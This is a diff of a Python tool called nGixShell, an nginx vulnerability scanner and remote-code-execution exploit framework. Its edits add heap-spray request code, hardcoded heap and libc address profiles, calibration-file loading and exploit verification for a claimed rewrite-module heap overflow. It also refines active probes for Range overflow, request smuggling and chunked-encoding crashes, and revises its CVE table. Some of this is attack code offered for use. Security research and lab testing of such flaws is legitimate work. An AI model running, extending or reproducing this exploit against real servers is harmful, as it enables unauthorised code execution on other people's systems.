@@ -3,6 +3,7 @@
 nGixShell — nginx CVE scanner + RCE exploit framework
 CVE-2026-42945 heap overflow + 52 other nginx vulnerabilities.
 """
+from __future__ import annotations
 
 BANNER = r"""
 ╔════════════════════════════════════════════════════════╗
@@ -19,7 +20,9 @@ BANNER = r"""
 import argparse
 import base64
 import datetime
+import html
 import json
+import os
 import random
 import re
 import select
@@ -29,6 +32,7 @@ import ssl
 import struct
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 from collections import OrderedDict
@@ -47,47 +51,16 @@ for _b in range(256):
 # Per-build database: maps nginx "Server:" version string → (HEAP_BASE, LIBC_BASE,
 # system_offset, PREREAD_HEAP_OFFSETS). Requires ASLR disabled on target.
 # Compute new entries with: python3 calibrate.py <host> <port> <worker_pid>
+# NOTE: address values are only valid for the EXACT target build + config used
+# during calibration, with ASLR disabled (kernel.randomize_va_space=0) and the
+# lab nginx.conf from env/. They are NOT portable across distros, versions,
+# libcs (glibc/musl) or architectures. Generate your own profile with:
+#   python3 calibrate.py <host> <port> <worker_pid> --json -o profile.json
+#   python3 ngixshell.py <host> --cmd 'id' --build-file profile.json
 KNOWN_BUILDS: dict = {
-    # nginx/1.25.3 — Docker nginx:1.25.3 (glibc/Debian, x86_64)
-    "nginx/1.25.3-glibc": {
-        "heap_base":  0x5555556cc000,
-        "libc_base":  0x7ffff77bb000,
-        "sys_offset": 0x4c490,
-        "offsets": [
-            0x05a427, 0x060e67,
-            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
-            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
-            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
-            0x103847, 0x108657, 0x10d467,
-        ],
-    },
-    # nginx/1.29.5 — Docker nginx:1.29.5 (glibc/Debian, x86_64)
-    "nginx/1.29.5-glibc": {
-        "heap_base":  0x5555556e6000,
-        "libc_base":  0x7ffff7573000,
-        "sys_offset": 0x53110,
-        "offsets": [
-            0x05a427, 0x060e67,
-            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
-            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
-            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
-            0x103847, 0x108657, 0x10d467,
-        ],
-    },
-    # nginx/1.26.3 — Docker nginx:1.26-alpine-slim (musl/Alpine, x86_64)
-    "nginx/1.26.3-musl": {
-        "heap_base":  0x555555686000,
-        "libc_base":  0x7ffff7f5c000,
-        "sys_offset": 0x449fd,
-        "offsets": [
-            0x05a427, 0x060e67,
-            0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
-            0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
-            0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
-            0x103847, 0x108657, 0x10d467,
-        ],
-    },
-    # Generic fallback — original research values (ASLR off, specific build)
+    # Reference values from the DepthFirst "Nginx-Rift" lab (Ubuntu jammy,
+    # nginx built from source, x86_64, ASLR off). Use --build-file for anything
+    # else — these will NOT work against stock Docker nginx images.
     "_default": {
         "heap_base":  0x555555659000,
         "libc_base":  0x7ffff77ba000,
@@ -117,7 +90,10 @@ def _apply_build(build_key: str | None, *, heap_base=None, libc_base=None,
                  system_addr=None, offsets=None) -> None:
     """Apply a known build profile or CLI overrides to the active constants."""
     global HEAP_BASE, LIBC_BASE, SYSTEM_ADDR, PREREAD_HEAP_OFFSETS
-    if build_key and build_key in KNOWN_BUILDS:
+    if build_key and build_key not in KNOWN_BUILDS:
+        log(f"[!] Unknown build profile '{build_key}' — ignored "
+            f"(known: {', '.join(k for k in KNOWN_BUILDS if k != '_default') or 'none'})")
+    elif build_key:
         b = KNOWN_BUILDS[build_key]
         HEAP_BASE   = b["heap_base"]
         LIBC_BASE   = b["libc_base"]
@@ -137,6 +113,48 @@ def _auto_select_build(version_str: str) -> str | None:
         if ver_part in version_str:
             return key
     return None
+
+
+def parse_offsets(spec: str) -> list:
+    """Parse a comma/space separated list of hex offsets ('0x5a427,0x60e67')."""
+    out = []
+    for tok in re.split(r"[,\s]+", spec.strip()):
+        if not tok:
+            continue
+        try:
+            out.append(int(tok, 16))
+        except ValueError:
+            log(f"[!] Ignoring invalid offset '{tok}' (expected hex)")
+    return out
+
+
+def load_calibration(path: str) -> dict:
+    """Load a calibration profile produced by calibrate.py --json."""
+    with open(path, "r", encoding="utf-8") as f:
+        data = json.load(f)
+    if not isinstance(data, dict):
+        raise ValueError("calibration file must contain a JSON object")
+
+    def _int(key):
+        v = data.get(key)
+        if v is None:
+            return None
+        return int(v, 0) if isinstance(v, str) else int(v)
+
+    out = {"heap_base": _int("heap_base"), "libc_base": _int("libc_base"),
+           "offsets": None}
+    sys_off = _int("sys_offset")
+    system_addr = _int("system_addr")
+    if system_addr is None and sys_off is not None and out["libc_base"] is not None:
+        system_addr = out["libc_base"] + sys_off
+    out["system_addr"] = system_addr
+    offs = data.get("offsets")
+    if isinstance(offs, list):
+        out["offsets"] = [int(o, 0) if isinstance(o, str) else int(o) for o in offs]
+    out["spray_count"] = data.get("spray_count")
+    out["spray_path"]  = data.get("spray_path")
+    out["spray_mode"]  = data.get("spray_mode")
+    return out
 
 VULN_MIN = (0, 6, 27)
 VULN_MAX = (1, 30, 0)
@@ -345,43 +363,40 @@ BROWSER_UAS = [
 # ─── CVE Database ─────────────────────────────────────────────────────────────
 CVE_DB = OrderedDict([
     ("CVE-2026-42945", {
-        "description": "Heap overflow in ngx_http_rewrite_module via URI percent-encoding mismatch (RCE)",
-        "cvss": 9.8, "severity": "CRITICAL",
-        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
-        "fixed_in": "1.31.0 / 1.30.1",
-        "config_required": ["rewrite", "set"],
-        "local_only": False, "probe": None, "exploit": True,
-        "ref": "https://my.f5.com/manage/s/article/K000160932",
-    }),
-    ("CVE-2026-42946", {
-        "description": "Memory corruption in nginx rewrite engine (sibling of CVE-2026-42945)",
+        "description": "Heap buffer overflow in ngx_http_rewrite_module via is_args/escape mismatch (RCE with ASLR off)",
         "cvss": 8.1, "severity": "HIGH",
         "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
         "fixed_in": "1.31.0 / 1.30.1",
-        "config_required": ["rewrite"],
+        "config_required": ["rewrite with '?' replacement", "set/if/rewrite after it"],
+        "local_only": False, "probe": None, "exploit": True,
+        "ref": "https://my.f5.com/manage/s/article/K000161019",
+    }),
+    ("CVE-2026-42946", {
+        "description": "Excessive memory allocation / over-read in ngx_http_scgi_module and ngx_http_uwsgi_module",
+        "cvss": 6.5, "severity": "MEDIUM",
+        "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
+        "fixed_in": "1.31.0 / 1.30.1",
+        "config_required": ["scgi_pass/uwsgi_pass"],
         "local_only": False, "probe": None, "exploit": False,
-        "same_advisory_as": "CVE-2026-42945",
-        "ref": "https://my.f5.com/manage/s/article/K000160932",
+        "ref": "https://my.f5.com/manage/s/article/K000161027",
     }),
     ("CVE-2026-40701", {
-        "description": "Memory corruption in nginx request processing (sibling of CVE-2026-42945)",
-        "cvss": 7.5, "severity": "HIGH",
+        "description": "ngx_http_ssl_module flaw with ssl_verify_client + ssl_ocsp (leaf/resolver) enabled",
+        "cvss": 4.8, "severity": "MEDIUM",
         "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
         "fixed_in": "1.31.0 / 1.30.1",
-        "config_required": [],
+        "config_required": ["ssl_verify_client", "ssl_ocsp"],
         "local_only": False, "probe": None, "exploit": False,
-        "same_advisory_as": "CVE-2026-42945",
-        "ref": "https://my.f5.com/manage/s/article/K000160932",
+        "ref": "https://my.f5.com/manage/s/article/K000161021",
     }),
     ("CVE-2026-42934", {
-        "description": "Memory corruption in nginx (sibling of CVE-2026-42945, same advisory)",
-        "cvss": 7.5, "severity": "HIGH",
+        "description": "ngx_http_charset_module flaw with charset/source_charset/charset_map + unbuffered proxy_pass",
+        "cvss": 4.8, "severity": "MEDIUM",
         "affected_min": (0, 6, 27), "affected_max": (1, 30, 0),
         "fixed_in": "1.31.0 / 1.30.1",
-        "config_required": [],
+        "config_required": ["charset", "proxy_pass (buffering off)"],
         "local_only": False, "probe": None, "exploit": False,
-        "same_advisory_as": "CVE-2026-42945",
-        "ref": "https://my.f5.com/manage/s/article/K000160932",
+        "ref": "https://my.f5.com/manage/s/article/K000161028",
     }),
     ("CVE-2022-41741", {
         "description": "Memory corruption in ngx_http_mp4_module via malicious mp4 file (RCE)",
@@ -502,17 +517,17 @@ CVE_DB = OrderedDict([
     }),
     # ── 2026 additional CVEs ────────────────────────────────────────────────────
     ("CVE-2026-42926", {
-        "description": "HTTP/2 request splitting via proxy allows response injection",
-        "cvss": 6.5, "severity": "MEDIUM",
+        "description": "HTTP/2 frame-header injection via proxy_http_version 2 + proxy_set_body",
+        "cvss": 5.8, "severity": "MEDIUM",
         "affected_min": (1, 29, 4), "affected_max": (1, 30, 0),
         "fixed_in": "1.31.0 / 1.30.1",
-        "config_required": ["proxy_pass"],
+        "config_required": ["proxy_http_version 2", "proxy_set_body"],
         "local_only": False, "probe": None, "exploit": False,
-        "ref": "https://nginx.org/en/security_advisories.html",
+        "ref": "https://my.f5.com/manage/s/article/K000161131",
     }),
     ("CVE-2026-40460", {
-        "description": "HTTP/3 QUIC connection spoofing via crafted packet",
-        "cvss": 5.3, "severity": "MEDIUM",
+        "description": "HTTP/3 QUIC source-address spoofing via crafted packet",
+        "cvss": 6.5, "severity": "MEDIUM",
         "affected_min": (1, 25, 0), "affected_max": (1, 30, 0),
         "fixed_in": "1.31.0 / 1.30.1",
         "config_required": ["http3"],
@@ -520,27 +535,26 @@ CVE_DB = OrderedDict([
         "ref": "https://nginx.org/en/security_advisories.html",
     }),
     ("CVE-2026-27784", {
-        "description": "Buffer overflow in ngx_http_mp4_module via crafted mp4 file",
-        "cvss": 7.5, "severity": "HIGH",
+        "description": "Buffer over-read/over-write in ngx_http_mp4_module (32-bit builds)",
+        "cvss": 7.8, "severity": "HIGH",
         "affected_min": (1, 1, 19), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
         "config_required": ["mp4"],
         "local_only": False, "probe": None, "exploit": False,
-        "ref": "https://nginx.org/en/security_advisories.html",
+        "ref": "https://my.f5.com/manage/s/article/K000160364",
     }),
     ("CVE-2026-32647", {
-        "description": "Buffer overflow in ngx_http_mp4_module (sibling of CVE-2026-27784)",
-        "cvss": 7.5, "severity": "HIGH",
+        "description": "Buffer over-read/over-write in ngx_http_mp4_module",
+        "cvss": 7.8, "severity": "HIGH",
         "affected_min": (1, 1, 19), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
         "config_required": ["mp4"],
         "local_only": False, "probe": None, "exploit": False,
-        "same_advisory_as": "CVE-2026-27784",
-        "ref": "https://nginx.org/en/security_advisories.html",
+        "ref": "https://my.f5.com/manage/s/article/K000160366",
     }),
     ("CVE-2026-27654", {
         "description": "Heap buffer overflow in ngx_http_dav_module via crafted request body",
-        "cvss": 6.5, "severity": "MEDIUM",
+        "cvss": 8.2, "severity": "HIGH",
         "affected_min": (0, 5, 13), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
         "config_required": ["dav"],
@@ -548,35 +562,35 @@ CVE_DB = OrderedDict([
         "ref": "https://nginx.org/en/security_advisories.html",
     }),
     ("CVE-2026-27651", {
-        "description": "NULL pointer dereference in nginx mail proxy (DoS)",
-        "cvss": 4.3, "severity": "MEDIUM",
+        "description": "Worker-process termination in ngx_mail_auth_http_module via undisclosed requests",
+        "cvss": 7.5, "severity": "HIGH",
         "affected_min": (0, 5, 15), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
-        "config_required": ["mail"],
+        "config_required": ["mail", "auth_http"],
         "local_only": False, "probe": None, "exploit": False,
         "ref": "https://nginx.org/en/security_advisories.html",
     }),
     ("CVE-2026-28753", {
-        "description": "Header injection in nginx mail proxy via crafted SMTP response",
-        "cvss": 6.5, "severity": "MEDIUM",
+        "description": "CRLF injection in ngx_mail_smtp_module via crafted DNS responses",
+        "cvss": 3.7, "severity": "LOW",
         "affected_min": (0, 6, 27), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
-        "config_required": ["mail"],
+        "config_required": ["mail", "smtp"],
         "local_only": False, "probe": None, "exploit": False,
-        "ref": "https://nginx.org/en/security_advisories.html",
+        "ref": "https://my.f5.com/manage/s/article/K000160367",
     }),
     ("CVE-2026-28755", {
-        "description": "Memory disclosure in OCSP response processing via crafted TLS stream",
-        "cvss": 5.3, "severity": "MEDIUM",
+        "description": "Revoked-certificate handling flaw in ngx_stream_ssl_module (ssl_verify_client + OCSP)",
+        "cvss": 5.4, "severity": "MEDIUM",
         "affected_min": (1, 27, 2), "affected_max": (1, 29, 6),
         "fixed_in": "1.30.0 / 1.29.7",
-        "config_required": ["ssl", "ssl_stapling"],
+        "config_required": ["stream ssl", "ssl_verify_client", "ssl_ocsp"],
         "local_only": False, "probe": None, "exploit": False,
-        "ref": "https://nginx.org/en/security_advisories.html",
+        "ref": "https://my.f5.com/manage/s/article/K000160368",
     }),
     ("CVE-2026-1642", {
         "description": "SSL upstream session reuse may expose data to wrong client",
-        "cvss": 6.5, "severity": "MEDIUM",
+        "cvss": 5.9, "severity": "MEDIUM",
         "affected_min": (1, 3, 0), "affected_max": (1, 29, 4),
         "fixed_in": "1.29.5",
         "config_required": ["proxy_pass", "ssl"],
@@ -585,8 +599,8 @@ CVE_DB = OrderedDict([
     }),
     # ── 2025 CVEs ───────────────────────────────────────────────────────────────
     ("CVE-2025-53859", {
-        "description": "Mail proxy SMTP command injection via crafted AUTH response",
-        "cvss": 4.3, "severity": "MEDIUM",
+        "description": "ngx_mail_smtp_module command injection via crafted AUTH response",
+        "cvss": 3.7, "severity": "LOW",
         "affected_min": (0, 7, 22), "affected_max": (1, 29, 0),
         "fixed_in": "1.29.1 / 1.28.1",
         "config_required": ["mail"],
@@ -595,7 +609,7 @@ CVE_DB = OrderedDict([
     }),
     ("CVE-2025-23419", {
         "description": "TLS session resumption may allow bypass of client certificate auth",
-        "cvss": 5.3, "severity": "MEDIUM",
+        "cvss": 4.3, "severity": "MEDIUM",
         "affected_min": (1, 11, 4), "affected_max": (1, 27, 3),
         "fixed_in": "1.27.4 / 1.26.3",
         "config_required": ["ssl", "ssl_verify_client"],
@@ -969,6 +983,33 @@ def _waf_obfuscate_path(path: str) -> str:
         return path + "/%20"
 
 
+_TLS_LABELS = {"TLSv1": "TLS 1.0", "TLSv1_1": "TLS 1.1",
+               "TLSv1_2": "TLS 1.2", "TLSv1_3": "TLS 1.3"}
+
+
+def _peer_cert_dict(ts: ssl.SSLSocket) -> dict:
+    """Decode the peer certificate even when verification is disabled.
+
+    ssl.getpeercert() returns {} unless the chain was validated, so decode the
+    DER form via the stdlib PEM decoder (no external dependencies).
+    """
+    try:
+        der = ts.getpeercert(binary_form=True)
+        if not der:
+            return {}
+        pem = ssl.DER_cert_to_PEM_cert(der)
+        fd, path = tempfile.mkstemp(suffix=".pem")
+        try:
+            with os.fdopen(fd, "w") as f:
+                f.write(pem)
+            return ssl._ssl._test_decode_cert(path) or {}
+        finally:
+            os.unlink(path)
+    except Exception as e:
+        vlog(f"[v] cert decode: {e}")
+        return {}
+
+
 def _parse_response(raw: bytes) -> tuple:
     """Split raw HTTP response into (status_code, headers_dict, body_bytes)."""
     if b"\r\n\r\n" in raw:
@@ -1013,6 +1054,7 @@ def _connect_socks5(host: str, port: int, proxy_host: str,
 
 def _connect(host: str, port: int, timeout: float = 5.0,
              tls: bool = False, proxy: str = None) -> socket.socket:
+    timeout = timeout * _tmul
     if proxy:
         p      = urlparse(proxy)
         scheme = p.scheme.lower()
@@ -1271,12 +1313,12 @@ def fingerprint_target(host: str, port: int,
 
         if tls:
             try:
-                raw = socket.create_connection((host, port), timeout=5)
+                raw = _connect(host, port, timeout=5, tls=False, proxy=proxy)
                 ctx = ssl.create_default_context()
                 ctx.check_hostname = False
                 ctx.verify_mode    = ssl.CERT_NONE
                 ts   = ctx.wrap_socket(raw, server_hostname=host)
-                cert = ts.getpeercert()
+                cert = _peer_cert_dict(ts)
                 ts.close()
                 if cert:
                     subj = dict(x[0] for x in cert.get("subject", []))
@@ -1480,7 +1522,7 @@ def check_stub_status(host: str, port: int,
             result["writing"] = int(m.group(2))
             result["waiting"] = int(m.group(3))
 
-        log(f"\n[!] nginx stub_status exposed at /nginx_status:")
+        log("\n[!] nginx stub_status exposed at /nginx_status:")
         for k, v in result.items():
             log(f"    {k}: {v}")
         return result
@@ -1504,7 +1546,6 @@ def vhost_enum(host: str, port: int,
         baseline_status, baseline_hdrs, baseline_body = _http_get(
             host, port, "/", tls=tls, proxy=proxy, timeout=5)
         baseline_len = len(baseline_body)
-        baseline_ct  = baseline_hdrs.get("content-type", "")
     except Exception as e:
         log(f"  [!] Baseline failed: {e}")
         return found
@@ -1539,10 +1580,8 @@ def vhost_enum(host: str, port: int,
             # Identical size across ALL probes = default server block, not a real vhost.
             size_diff   = abs(size - baseline_len)
             status_diff = status != baseline_status
-            # require both status AND body to differ, or a significant body difference
-            different = status_diff and size_diff > 100
-            if not different and size_diff > 500 and ct != baseline_ct:
-                different = True  # different content-type with large body change
+            # status + body differ, or a large body difference (heuristic)
+            different = (status_diff and size_diff > 100) or size_diff > 500
 
             if different:
                 note = (f"status {baseline_status}→{status}, body {baseline_len}→{size}b"
@@ -1577,6 +1616,7 @@ def tls_audit(host: str, port: int, proxy: str = None) -> dict:
         if hasattr(ssl.TLSVersion, attr):
             proto_tests.append(attr)
 
+    unreachable = 0
     for proto_name in proto_tests:
         try:
             import warnings
@@ -1588,11 +1628,11 @@ def tls_audit(host: str, port: int, proxy: str = None) -> dict:
                 warnings.simplefilter("ignore", DeprecationWarning)
                 ctx.minimum_version = ver
                 ctx.maximum_version = ver
-            raw = socket.create_connection((host, port), timeout=4)
+            raw = _connect(host, port, timeout=4, tls=False, proxy=proxy)
             ts  = ctx.wrap_socket(raw, server_hostname=host)
             ts.close()
             result["protocols"][proto_name] = True
-            label    = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
+            label    = _TLS_LABELS.get(proto_name, proto_name)
             is_old   = proto_name in ("TLSv1", "TLSv1_1")
             severity = "HIGH" if is_old else "INFO"
             msg      = f"{label} supported{'  ← DEPRECATED' if is_old else ''}"
@@ -1601,20 +1641,26 @@ def tls_audit(host: str, port: int, proxy: str = None) -> dict:
                 issues.append({"issue": f"{label} supported (deprecated)", "severity": severity})
         except ssl.SSLError:
             result["protocols"][proto_name] = False
-            label = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
+            label = _TLS_LABELS.get(proto_name, proto_name)
             log(f"  [-] {label:<20} {'OK':<8} not supported")
         except Exception as e:
+            unreachable += 1
             vlog(f"[v] TLS {proto_name}: {e}")
+
+    if unreachable == len(proto_tests) and not any(result["protocols"].values()):
+        log("  [!] TLS audit inconclusive — connection/handshake failed for every protocol")
+        issues.append({"issue": "TLS audit inconclusive (handshake failures)",
+                       "severity": "INFO"})
 
     # Certificate checks
     try:
-        raw = socket.create_connection((host, port), timeout=5)
+        raw = _connect(host, port, timeout=5, tls=False, proxy=proxy)
         try:
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode    = ssl.CERT_NONE
             ts   = ctx.wrap_socket(raw, server_hostname=host)
-            cert = ts.getpeercert()
+            cert = _peer_cert_dict(ts)
             ts.close()
         except Exception:
             raw.close()
@@ -1794,16 +1840,27 @@ def probe_range_overflow(host, port, tls, proxy):
             "Range": "bytes=0-,9223372036854775807"})) + b"\r\n")
         s.settimeout(5)
         raw = b""
-        while b"\r\n" not in raw:
+        while b"\r\n\r\n" not in raw:
             chunk = s.recv(512)
             if not chunk: break
             raw += chunk
         s.close()
-        parts  = raw.decode("latin-1").split()
-        status = int(parts[1]) if len(parts) > 1 else 0
-        if status == 400:        return False, "400 — patched"
-        if status in (416, 200): return False, f"{status} — range ignored"
-        return True, f"Status {status} — overflow Range indicator"
+        status, hdrs, _ = _parse_response(raw)
+        cr = hdrs.get("content-range", "")
+        if status == 400:
+            return False, "400 — patched"
+        if status == 416:
+            # CVE-2017-7529 signature: bogus/overflowed Content-Range value
+            m = re.search(r"bytes \*/(\d+)", cr)
+            if m and int(m.group(1)) > 0x7fffffffffffffff:
+                return True, f"416 with overflowed Content-Range: {cr}"
+            return False, "416 — range rejected (patched)"
+        if status in (200, 206):
+            m = re.search(r"bytes (\d+)-(\d+)/(\d+)", cr)
+            if m and int(m.group(3)) > 0x7fffffffffffffff:
+                return True, f"Content-Range integer overflow: {cr}"
+            return False, f"{status} — range handled normally"
+        return None, f"status {status} — inconclusive"
     except Exception as e:
         return None, f"probe error: {e}"
 
@@ -1826,7 +1883,9 @@ def probe_smuggling(host, port, tls, proxy):
         except socket.timeout:
             pass
         s.close()
-        if raw.count(b"HTTP/") >= 2: return True, "Two HTTP responses — smuggling indicator"
+        status_lines = re.findall(rb"(?m)^HTTP/\d\.\d\s+\d{3}", raw)
+        if len(status_lines) >= 2:
+            return True, f"{len(status_lines)} HTTP status lines — smuggling indicator"
         return False, "Single response"
     except Exception as e:
         return None, f"probe error: {e}"
@@ -1842,7 +1901,15 @@ def probe_chunked(host, port, tls, proxy):
         try:   resp = s.recv(512)
         except socket.timeout: resp = b""
         s.close()
-        if not resp: return True, "No response — possible crash"
+        if not resp:
+            # Distinguish "worker crashed" from "still waiting for more chunks"
+            try:
+                if _http_head(host, port, "/", tls=tls, proxy=proxy,
+                              timeout=3).get("status_code"):
+                    return False, "no response, but server alive — request still pending"
+            except Exception:
+                pass
+            return True, "no response and server unreachable — possible crash"
         parts  = resp.split()
         status = int(parts[1]) if len(parts) > 1 else 0
         if status in (400, 411, 413): return False, f"{status} — patched"
@@ -1856,7 +1923,7 @@ def probe_chunked(host, port, tls, proxy):
 def probe_ipv6_bypass(host, port, tls, proxy):
     try:
         if _rate_limiter: _rate_limiter.acquire()
-        baseline = _http_head(host, port, tls=tls, proxy=proxy, timeout=5).get("status_code", 0)
+        baseline, _, _ = _http_get(host, port, "/", tls=tls, proxy=proxy, timeout=5)
         s = _connect(host, port, tls=tls, proxy=proxy, timeout=5)
         s.sendall(b"GET / HTTP/1.1\r\nHost: [::1]\r\nUser-Agent: " +
                   _user_agent.encode() + b"\r\nConnection: close\r\n\r\n")
@@ -1958,28 +2025,36 @@ def cve_scan(host: str, port: int, tls: bool = False,
     detected_advisories = set()  # track which advisories already have a confirmed finding
 
     for cve_id, info in targets.items():
+        probe_name   = info.get("probe")
+        has_probe    = bool(probe_name and probe_name in PROBE_REGISTRY)
+        version_match = (version is not None and
+                         _version_in_range(version, info["affected_min"], info["affected_max"]))
         if info.get("local_only"):
             status = "LOCAL-ONLY"
-        elif version is None:
-            status = "UNKNOWN"
-        elif _version_in_range(version, info["affected_min"], info["affected_max"]):
+        elif version_match:
             # If this CVE is a sibling of an already-confirmed finding, suppress it
             parent = info.get("same_advisory_as")
             if parent and parent in detected_advisories:
                 status = "SAME-ADVISORY"
+            elif has_probe:
+                result, msg = _run_probe_with_retry(
+                    PROBE_REGISTRY[probe_name], host, port, tls, proxy)
+                vlog(f"[v] {cve_id}: {msg}")
+                status = ("VULNERABLE" if result is True
+                          else "PROBE-CLEAN" if result is False
+                          else "VERSION-MATCH")
+            elif info.get("exploit"):
+                status = "EXPLOIT-AVAIL"
             else:
-                probe_name = info.get("probe")
-                if probe_name and probe_name in PROBE_REGISTRY:
-                    result, msg = _run_probe_with_retry(
-                        PROBE_REGISTRY[probe_name], host, port, tls, proxy)
-                    vlog(f"[v] {cve_id}: {msg}")
-                    status = ("VULNERABLE" if result is True
-                              else "PROBE-CLEAN" if result is False
-                              else "VERSION-MATCH")
-                elif info.get("exploit"):
-                    status = "EXPLOIT-AVAIL"
-                else:
-                    status = "VERSION-MATCH"
+                status = "VERSION-MATCH"
+        elif version is None and has_probe:
+            # Version hidden (server_tokens off) — fall back to active probing
+            result, msg = _run_probe_with_retry(
+                PROBE_REGISTRY[probe_name], host, port, tls, proxy)
+            vlog(f"[v] {cve_id}: {msg}")
+            status = ("VULNERABLE" if result is True
+                      else "PROBE-CLEAN" if result is False
+                      else "UNKNOWN")
         else:
             status = "PATCHED"
 
@@ -2015,7 +2090,7 @@ def cve_scan(host: str, port: int, tls: bool = False,
             log(f"      Fixed in : {info['fixed_in']}")
             log(f"      Ref      : {info.get('ref', 'N/A')}")
             if info.get("exploit"):
-                log(f"      Exploit  : run with --cmd 'id' or --shell")
+                log("      Exploit  : run with --cmd 'id' or --shell")
             if info.get("config_required"):
                 log(f"      Requires : {', '.join(info['config_required'])}")
 
@@ -2023,6 +2098,22 @@ def cve_scan(host: str, port: int, tls: bool = False,
 
 
 # ─── Exploit ──────────────────────────────────────────────────────────────────
+
+def _verify_effect(url: str, tls: bool, proxy: str) -> bool:
+    """Fetch --verify-url after exploitation; 200 confirms the command's effect."""
+    try:
+        p       = urlparse(url)
+        host    = p.hostname or ""
+        port    = p.port or (443 if p.scheme == "https" else 80)
+        use_tls = p.scheme == "https" or tls
+        status, _, _ = _http_get(host, port, p.path or "/",
+                                 tls=use_tls, proxy=proxy, timeout=5)
+        log(f"[*] Verify URL {url} → HTTP {status}")
+        return status == 200
+    except Exception as e:
+        vlog(f"[v] verify url: {e}")
+        return False
+
 
 def wait_alive(host: str, port: int, timeout: int = 30,
                tls: bool = False, proxy: str = None) -> bool:
@@ -2047,7 +2138,7 @@ def wait_alive(host: str, port: int, timeout: int = 30,
 
 
 def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
-            rewrite_path="/api"):
+            rewrite_path="/api", spray_path="/upload", spray_mode="partial"):
     sprays = []
     # Incomplete-header heap spray: send request line + partial headers
     # without the terminating \r\n\r\n.  nginx stays in "reading headers"
@@ -2066,23 +2157,34 @@ def attempt(host, port, target_bytes, body, n_spray, body_len, tls, proxy,
     # locations (try_files) return 405 for POST before reading the body, so
     # the body allocation is never made and the spray has no effect.
     # The lab env/nginx.conf ships a /upload location backed by a dummy
-    # proxy_pass for exactly this purpose.
-    spray_path = "/upload"
+    # proxy_pass for exactly this purpose (override with --spray-path).
     for i in range(n_spray):
         try:
             s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
-            # Send complete headers + PARTIAL body (body_len bytes, but claim
-            # body_len*4 via Content-Length).  nginx buffers what it receives
-            # and then waits for the remaining bytes (up to client_body_timeout,
-            # default 60 s), holding our fake-struct allocation live.
-            hold_size = body_len * 4
-            s.sendall(
-                b"POST " + spray_path.encode() + b" HTTP/1.1\r\n"
-                b"Host: " + host.encode() + b"\r\n"
-                b"Content-Length: " + str(hold_size).encode() + b"\r\n"
-                b"Connection: keep-alive\r\n"
-                b"\r\n" + body          # partial body (len=body_len < hold_size)
-            )
+            if spray_mode == "full":
+                # DepthFirst lab technique: complete body + X-Delay so the
+                # backend keeps the request (and its body buffer) alive.
+                s.sendall(
+                    b"POST " + spray_path.encode() + b" HTTP/1.1\r\n"
+                    b"Host: " + host.encode() + b"\r\n"
+                    b"Content-Length: " + str(body_len).encode() + b"\r\n"
+                    b"X-Delay: 60\r\n"
+                    b"Connection: close\r\n"
+                    b"\r\n" + body
+                )
+            else:
+                # Send complete headers + PARTIAL body (body_len bytes, but
+                # claim body_len*4 via Content-Length).  nginx buffers what it
+                # receives and then waits for the remaining bytes (up to
+                # client_body_timeout), holding our fake-struct allocation live.
+                hold_size = body_len * 4
+                s.sendall(
+                    b"POST " + spray_path.encode() + b" HTTP/1.1\r\n"
+                    b"Host: " + host.encode() + b"\r\n"
+                    b"Content-Length: " + str(hold_size).encode() + b"\r\n"
+                    b"Connection: keep-alive\r\n"
+                    b"\r\n" + body          # partial body (len=body_len < hold_size)
+                )
             sprays.append(s)
         except Exception as e:
             vlog(f"[v] Spray {i}: {e}")
@@ -2377,15 +2479,18 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
     ts   = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
     # CVE table rows
+    def e(value) -> str:
+        return html.escape(str(value), quote=True)
+
     cve_rows = ""
     for cve_id, info, status in findings:
         sc = _STATUS_COLOR.get(status, "#888")
         vc = _SEV_COLOR.get(info["severity"], "#888")
-        cve_rows += (f"<tr><td><a href='{info.get('ref','')}' style='color:#58a6ff'>{cve_id}</a></td>"
-                     f"<td style='color:{vc}'>{info['cvss']} {info['severity']}</td>"
-                     f"<td style='color:{sc};font-weight:bold'>{status}</td>"
-                     f"<td>{info['description']}</td>"
-                     f"<td>{info['fixed_in']}</td></tr>\n")
+        cve_rows += (f"<tr><td><a href='{e(info.get('ref',''))}' style='color:#58a6ff'>{e(cve_id)}</a></td>"
+                     f"<td style='color:{vc}'>{info['cvss']} {e(info['severity'])}</td>"
+                     f"<td style='color:{sc};font-weight:bold'>{e(status)}</td>"
+                     f"<td>{e(info['description'])}</td>"
+                     f"<td>{e(info['fixed_in'])}</td></tr>\n")
 
     # Fingerprint section
     fp_html = ""
@@ -2393,7 +2498,7 @@ def generate_html_report(host, port, findings, fingerprint=None, web_audit=None,
         fp_html = "<h2>Fingerprint</h2><table>"
         for k, v in fingerprint.items():
             if k == "version_tuple": continue
-            fp_html += f"<tr><td style='color:#8b949e;padding-right:16px'>{k}</td><td>{v}</td></tr>"
